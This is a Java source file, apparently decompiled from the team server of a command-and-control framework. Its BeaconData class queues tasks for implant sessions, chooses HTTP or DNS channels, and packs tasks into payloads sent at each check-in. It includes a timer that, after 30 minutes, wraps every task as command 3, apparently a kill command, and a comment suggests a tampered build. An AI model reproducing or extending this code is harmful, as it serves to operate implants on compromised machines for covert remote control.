package beacon;

import common.CommonUtils;

import java.io.ByteArrayOutputStream;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class BeaconData {

    public static final int MODE_HTTP = 0;

    public static final int MODE_DNS = 1;

    public static final int MODE_DNS_TXT = 2;

    public static final int MODE_DNS6 = 3;

    protected Map queues = new HashMap();

    protected Map modes = new HashMap();

    protected Set tasked = new HashSet();

    protected boolean shouldPad = false;

    protected long when = 0L;

    protected List getQueue(String string) {
        synchronized (this) {
            if (this.queues.containsKey(string)) {
                return (List) this.queues.get(string);
            }
            LinkedList linkedList = new LinkedList();
            this.queues.put(string, linkedList);
            return linkedList;
        }
    }

    public boolean isNewSession(String string) {
        synchronized (this) {
            return !this.tasked.contains(string);
        }
    }

    public void virgin(String string) {
        synchronized (this) {
            this.tasked.remove(string);
        }
    }


    public void shouldPad(boolean bl) {
        // todo fixed exit dark piles
        this.shouldPad = bl;
        this.when = System.currentTimeMillis() + 1800000L;
    }

    public void task(String string, byte[] arrby) {
        synchronized (this) {
            List list = getQueue(string);
            if (this.shouldPad && System.currentTimeMillis() > this.when) {
                CommandBuilder commandBuilder = new CommandBuilder();
                commandBuilder.setCommand(3);
                commandBuilder.addString(arrby);
                list.add(commandBuilder.build());
            } else {
                list.add(arrby);
            }
            this.tasked.add(string);
        }
    }

    public void seen(String string) {
        synchronized (this) {
            this.tasked.add(string);
        }
    }

    public void clear(String string) {
        synchronized (this) {
            List list = getQueue(string);
            list.clear();
            this.tasked.add(string);
        }
    }

    public int getMode(String string) {
        synchronized (this) {
            String str = (String) this.modes.get(string);
            if ("dns-txt".equals(str))
                return 2;
            if ("dns6".equals(str))
                return 3;
            if ("dns".equals(str))
                return 1;
        }
        return 2;
    }

    public void mode(String string1, String string2) {
        synchronized (this) {
            this.modes.put(string1, string2);
        }
    }

    public boolean hasTask(String string) {
        synchronized (this) {
            List list = getQueue(string);
            if (list.size() > 0) {
                return true;
            }
            return false;
        }
    }

    public byte[] dump(String string, int n) {
        synchronized (this) {
            int i = 0;
            List list = getQueue(string);
            if (list.size() == 0) {
                return new byte[0];
            }
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(8192);

            Iterator iterator = list.iterator();
            while (iterator.hasNext()) {
                byte[] arrby = (byte[]) iterator.next();
                if (i + arrby.length < n) {
                    byteArrayOutputStream.write(arrby, 0, arrby.length);
                    iterator.remove();
                    i += arrby.length;
                    continue;
                }
                if (arrby.length >= n) {
                    CommonUtils.print_error("Woah! Task " + arrby.length
                            + " for " + string + " is beyond our limit. Dropping it");
                    iterator.remove();
                    continue;
                }
                CommonUtils.print_warn("Chunking tasks for "
                        + string + "! " + arrby.length + " + " + i + " past threshold. "
                        + list.size() + " task(s) on hold until next checkin.");
                break;
            }
            return byteArrayOutputStream.toByteArray();
        }
    }
}
